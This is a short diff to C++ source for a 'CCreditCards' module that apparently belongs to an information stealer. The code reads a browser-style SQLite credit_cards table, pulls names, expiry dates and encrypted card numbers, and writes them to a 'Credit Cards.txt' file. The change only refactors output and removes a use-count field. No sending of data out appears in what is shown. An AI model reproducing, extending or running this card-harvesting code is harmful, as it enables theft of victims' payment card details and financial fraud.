@@ -20,14 +20,8 @@ void CCreditCards::execute(const fs::path &root, const std::string &name, const 
 
     std::stringstream ss;
 
-    for(const CreditCard &row : history)
-    {
-        ss << "Card: " << row.card_number << "\n";
-        ss << "  Expiration: " << std::to_string(row.expiration_month) << "/" << std::to_string(row.expiration_year) << "\n";
-        ss << "  Name: " << row.name_on_card << "\n";
-        ss << "  Used: " << row.use_count << "\n";
-        ss << "\n";
-    }
+    for(CreditCard &row : history)
+        row.write(ss);
 
     Utils::writeFile(root / "Credit Cards.txt", ss.str(), true);
 }
@@ -43,7 +37,7 @@ std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
         return {};
     }
 
-    const char* sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, use_count FROM credit_cards ORDER BY use_count DESC";
+    const char* sql = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards ORDER BY use_count DESC";
     rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
     if (rc != SQLITE_OK) {
         sqlite3_close(db);
@@ -58,13 +52,10 @@ std::list<CreditCard> CCreditCards::getCreditCards(const fs::path &db_path) {
         const void* card_number_encrypted = sqlite3_column_blob(stmt, 3);
         int card_number_size = sqlite3_column_bytes(stmt, 3);
 
-        int use_count = sqlite3_column_int(stmt, 4);
-
         CreditCard creditCardRecord;
         creditCardRecord.name_on_card = std::string(reinterpret_cast<const char*>(name_on_card));
         creditCardRecord.expiration_month = expiration_month;
         creditCardRecord.expiration_year = expiration_year;
-        creditCardRecord.use_count = use_count;
 
         std::vector<BYTE> card_number;
         card_number.assign(static_cast<const BYTE*>(card_number_encrypted), static_cast<const BYTE*>(card_number_encrypted) + card_number_size);
